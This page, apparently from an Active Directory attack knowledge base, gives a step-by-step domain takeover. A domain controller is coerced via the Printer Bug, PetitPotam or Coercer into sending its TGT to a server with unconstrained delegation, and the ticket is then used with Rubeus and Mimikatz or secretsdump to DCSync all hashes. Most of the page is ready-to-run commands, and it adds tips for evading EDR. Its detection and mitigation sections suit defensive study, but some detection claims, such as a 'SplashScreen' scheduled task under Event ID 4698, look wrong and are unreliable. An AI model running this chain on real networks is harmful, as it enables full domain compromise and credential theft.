# Domain Compromise via DC Print Server and Kerberos Unconstrained Delegation

## Overview

Combining the **MS-RPRN Printer Bug** (SpoolSample) with **Kerberos unconstrained delegation** is a devastating attack path to Domain Compromise. The Printer Bug coerces a Domain Controller to authenticate to an attacker-controlled server. If that server has unconstrained delegation enabled, the DC's **TGT** is forwarded along with the connection — granting the attacker full Domain Admin-level access.

### Attack Flow Summary

```
1. Find Server w/ Unconstrained Delegation
2. Compromise that server (or run from it)
3. Start Rubeus monitor on the server
4. Trigger Printer Bug → DC auths to your server
5. Capture DC's TGT
6. DCSync entire domain
```

### Why This Works

- **Unconstrained delegation** stores the user's TGT in the service ticket sent to the server
- The **Printer Bug** (MS-RPRN `RpcRemoteFindFirstPrinterChangeNotification`) forces a target machine to connect back to a specified server via SMB
- The SMB connection uses Kerberos authentication, which sends the TGT to an unconstrained delegation server
- The **Domain Controller's machine account** has replication rights — DCSync is possible once the DC's TGT is captured

## Attack Chain Step-by-Step

### Step 1: Find a Server with Unconstrained Delegation

```powershell
# PowerView - Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# PowerView - Find all objects with trust for delegation
Get-DomainComputer -TrustedForDelegation

# AD PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, Name, OperatingSystem

# BloodHound query to find unconstrained delegation servers
MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c
```

**What to look for**:
- Domain controllers (unconstrained delegation is set)
- File servers with delegation configured
- SQL servers with Kerberos delegation
- Any server where `userAccountControl` has `TRUSTED_FOR_DELEGATION` flag

### Step 2: Compromise the Unconstrained Delegation Server

This can be done by:
- Already having admin access on the server
- Exploiting a vulnerability on the server
- Using a service account that has local admin on the server

### Step 3: Monitor for Incoming TGTs with Rubeus

Run Rubeus in monitor mode on the compromised unconstrained delegation server:

```cmd
# Monitor for TGTs every 5 seconds
Rubeus.exe monitor /interval:5 /nowrap

# Monitor with output to file
Rubeus.exe monitor /interval:5 /nowrap /outfile:captured_tickets.txt

# Monitor and automatically use captured tickets
Rubeus.exe monitor /interval:5 /autoexit /nowrap
```

Rubeus monitor output when a TGT is captured:
```
[*] Action: TGT Monitor
[*] Using integrated authentication
[*] Monitoring for TGTs every 5 seconds
[*] Press Ctrl+C to stop monitoring

[!]  3/15/2025 10:30:45 AM - TGT captured for user: DC$@domain.local
[*]   base64(ticket.kirbi):

      doIFojCCBZ6gAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ0bC0RPTUFJTi5M...
      
[*]   Hash: $krb5tgs$...
```

### Step 4: Trigger the Printer Bug

Use SpoolSample or printerbug.py to coerce the DC to connect back to your unconstrained delegation server.

#### SpoolSample (Windows)

```cmd
# SpoolSample usage: SpoolSample.exe <target> <capture_server>
SpoolSample.exe DC.domain.local YOURSERVER.domain.local

# Alternative syntax
SpoolSample.exe DC YOURSERVER
```

#### printerbug.py (Linux -- Impacket)

```bash
# Run from any Linux machine, not just the delegation server
python3 printerbug.py "domain.local/user:Password123!"@DC.domain.local YOURSERVER.domain.local

# With hashes
python3 printerbug.py -hashes :NTLM_HASH "domain.local/user"@DC.domain.local YOURSERVER.domain.local

# With Kerberos auth
python3 printerbug.py -k "domain.local/user"@DC.domain.local YOURSERVER.domain.local
```

#### What Happens Internally

```
1. Printer Bug tool connects to DC's MS-RPRN service (pipe/spoolss)
2. Calls RpcRemoteFindFirstPrinterChangeNotification(server=YOURSERVER)
3. DC's spoolsv.exe initiates an SMB connection to YOURSERVER
4. YOURSERVER has unconstrained delegation → DC includes its TGT
5. Rubeus captures DC$'s TGT from LSASS
```

### Step 5: Capture the DC's TGT

When the Printer Bug triggers, Rubeus will capture the DC machine account's TGT:

```
[!] TGT captured for user: DC$@domain.local
[*] base64(ticket.kirbi):

doIFojCCBZ6gAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ0bC0RPTUFJTi5M...
```

### Step 6: Pass the Captured TGT

```cmd
# Import the captured ticket
Rubeus.exe ptt /ticket:BASE64_TICKET /nowrap

# Or from a file
Rubeus.exe ptt /ticket:ticket.kirbi

# Verify the ticket is loaded
klist
```

### Step 7: DCSync the Domain

With the DC's TGT imported, you have the machine account's credentials. The DC machine account (`DC$`) has replication rights:

#### Using Mimikatz

```cmd
# On the server where tickets are loaded
privilege::debug
lsadump::dcsync /domain:domain.local /all /csv

# Get specific user hashes
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /user:krbtgt
```

#### Using secretsdump (Linux)

```bash
# If you exported the captured ticket as a ccache file
export KRB5CCNAME=dc.ccache

# DCSync using Kerberos auth
python3 secretsdump.py -k -no-pass "domain.local/DC\$@DC.domain.local"

# Export all NTLM hashes
python3 secretsdump.py -k -no-pass "domain.local/DC\$@DC.domain.local" -just-dc-ntlm
```

#### Using Impacket wmiexec

```bash
# Execute commands as the DC
export KRB5CCNAME=dc.ccache
python3 wmiexec.py -k -no-pass "domain.local/DC\$@DC.domain.local"
```

## Alternative: Using PetitPotam Instead of Printer Bug

PetitPotam (MS-EFSRPC) triggers a similar coercion via the Encrypting File System Remote Protocol:

```bash
# PetitPotam - coerce DC to authenticate to your server
python3 PetitPotam.py YOURSERVER.domain.local DC.domain.local

# Alternative syntax
python3 PetitPotam.py -port 445 YOURSERVER.domain.local DC.domain.local
```

### PetitPotam vs Printer Bug

| Tool | Protocol | Detection Rate | Success Rate |
|------|----------|----------------|--------------|
| SpoolSample | MS-RPRN (spoolsv) | High (known malicious) | High |
| printerbug.py | MS-RPRN (spoolsv) | High | High |
| PetitPotam | MS-EFSRPC (EFS) | Medium-High | Very High |
| Coercer | Multiple | Varies | Very High |

## Alternative: Using Coercer

Coercer is a more comprehensive coercion tool that tries multiple protocols:

```bash
# Scan for available coercion methods
python3 coercer.py scan -t DC.domain.local -u 'user' -p 'pass'

# Coerce using all available methods
python3 coercer.py coerce -t DC.domain.local -l YOURSERVER.domain.local -u 'user' -p 'pass'

# Coerce with a specific method
python3 coercer.py coerce -t DC.domain.local -l YOURSERVER.domain.local -u 'user' -p 'pass' -m "MS-RPRN"
```

## Complete Automated Chain

### Using Rubeus + SpoolSample (All on Windows)

```cmd
# On the server with unconstrained delegation:

# Step 1: Start monitoring in a separate window/background
start /B Rubeus.exe monitor /interval:2 /nowrap > captured.txt

# Step 2: Trigger the Printer Bug
SpoolSample.exe DC.domain.local YOURSERVER.domain.local

# Step 3: Wait for capture (check captured.txt)
type captured.txt

# Step 4: Extract the base64 ticket and use it
Rubeus.exe ptt /ticket:BASE64

# Step 5: DCSync
privilege::debug
lsadump::dcsync /domain:domain.local /all /csv
```

### Using Impacket + Rubeus (Cross-Platform)

```bash
# Terminal 1: On the server, start Rubeus monitor
Rubeus.exe monitor /interval:3 /nowrap

# Terminal 2: From Linux, trigger the printer bug
python3 printerbug.py "domain.local/user:Password123!"@DC.domain.local YOURSERVER.domain.local

# Terminal 1: After capture, pass the ticket
Rubeus.exe ptt /ticket:BASE64

# Continue on Linux OR Windows
```

## OPSEC Considerations

### Rubeus Monitor is Noisy

- Rubeus monitor polls LSASS every N seconds via `LsaCallAuthenticationPackage`
- This generates frequent calls to the LSA subsystem
- Antivirus/EDR may flag the repeated LSASS querying
- Consider using shorter monitoring windows and auto-exit

### Printer Bug Detection

- The Printer Bug generates Event ID 4698 (scheduled task creation) on newer Windows
- MS-RPRN connections are logged as Event ID 7036 (service events)
- SMB connections with unusual source/destination IPs
- SpoolSample.exe is heavily signatured by AV/EDR

### Network Considerations

- The DC must be able to reach your server via SMB
- Firewalls blocking port 445 will prevent the attack
- Consider using DNS names that resolve in the target environment
- The attack may fail over WAN links due to Kerberos time skew

### Reducing Noise

```cmd
# Use shorter monitoring intervals
Rubeus.exe monitor /interval:15 /nowrap /autoexit:30

# /autoexit stops the monitor after N seconds with no capture
Rubeus.exe monitor /interval:5 /nowrap /autoexit:120

# Use specific LDAP filter for targeting
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC$
```

## Detection

### Event ID 4698 — Scheduled Task Creation (Printer Bug)

Newer Windows versions create a scheduled task when the Printer Bug is triggered:

```
A scheduled task was created.
  Task Name: \Microsoft\Windows\Printing\SplashScreen
  Task Content: ... RpcRemoteFindFirstPrinterChangeNotification ...
```

### Event ID 4768 — Kerberos TGT Request

When the DC's TGT is used for DCSync:

```
A Kerberos authentication ticket (TGT) was requested.
  Account: DC$@domain.local
  Service: krbtgt
  Client Address: YOURSERVER
  Encryption Type: AES256
```

### Event ID 4662 — Directory Service Access (DCSync)

```
An operation was performed on an object.
  Object: DC=domain,DC=local
  Access: DS-Replication-Get-Changes
  Access Mask: 0x100
```

### Event ID 5140 — File Share Access

```
A network share object was accessed.
  Share Name: \\*\IPC$
  Source Address: DC_IP
  Account Name: DC$@domain.local
```

### Detection Rules

```powershell
# Detect Printer Bug via 4698
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4698} |
    Where-Object { $_.Message -match "Printing" -or $_.Message -match "SplashScreen" }

# Detect unusual DC authentication
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4768} |
    Where-Object { $_.Properties[1].Value -match "DC\$" -and
                   $_.Properties[8].Value -ne "DC_IP" }
```

### BloodHound Detection

```cypher
// Find all servers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Find paths from unconstrained delegation servers to DC
MATCH p = (c:Computer {unconstraineddelegation:true})-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p
```

## Mitigations

| Mitigation | Description | Impact |
|------------|-------------|--------|
| Disable Unconstrained Delegation | Replace with constrained or resource-based delegation | Prevents TGT forwarding |
| SMB Signing | Enable SMB signing on all systems | Blocks NTLM relay |
| SMB Encryption | Enable SMB encryption | Blocks credential capture |
| Stop Spooler Service | Disable Print Spooler on DCs | Prevents Printer Bug |
| Protected Users Group | Add sensitive accounts to Protected Users | Limits delegation |
| Monitor Unconstrained Servers | Audit all servers with unconstrained delegation | Detection |

### Disabling Unconstrained Delegation

```powershell
# Find all servers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, Name

# Disable unconstrained delegation
Set-ADComputer -Identity "SERVER" -TrustedForDelegation $false
```

### Disabling Print Spooler on Domain Controllers

```powershell
# Stop and disable spooler on DC
Set-Service -Name Spooler -StartupType Disabled
Stop-Service -Name Spooler

# Via Group Policy
# Computer Configuration > Administrative Templates > Printers
# "Allow Print Spooler to accept client connections" = Disabled
```

### Enable SMB Signing

```powershell
# Via GPO or registry
# Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# Microsoft network server: Digitally sign communications (always) = Enabled
# Microsoft network client: Digitally sign communications (always) = Enabled

# Verify SMB signing
Get-SmbServerConfiguration | Select EnableSecuritySignature, RequireSecuritySignature
```

## Tools Reference

| Tool | Purpose | Source |
|------|---------|--------|
| SpoolSample | Windows MS-RPRN coercion | GitHub (leechristensen) |
| printerbug.py | Linux MS-RPRN coercion | Impacket examples |
| Rubeus | TGT monitoring and ticket manipulation | GhostPack |
| PetitPotam | MS-EFSRPC coercion | GitHub (topotam) |
| Coercer | Multi-protocol coercion | GitHub (p0dalirius) |
| Mimikatz | DCSync and credential dumping | GitHub (gentilkiwi) |
| secretsdump.py | DCSync from Linux | Impacket |

## Cross-References

- [Unconstrained Delegation](../05_Privilege_Escalation/05_Unconstrained_Delegation.md)
- [Kerberos Delegation Abuse](../06_Kerberos_Attacks/07_Kerberos_Delegation.md)
- [DCSync Attack](../03_Credential_Access/01_DCSync.md)
- [Tools Reference - Rubeus](../09_Tools_Reference/README.md)
- [Tools Reference - Mimikatz](../09_Tools_Reference/README.md)
- [Tools Reference - Impacket](../09_Tools_Reference/README.md)
- [ADCS + PetitPotam NTLM Relay](../07_ADCS_Attacks/08_ESC8_PetitPotam_krbtgt.md)
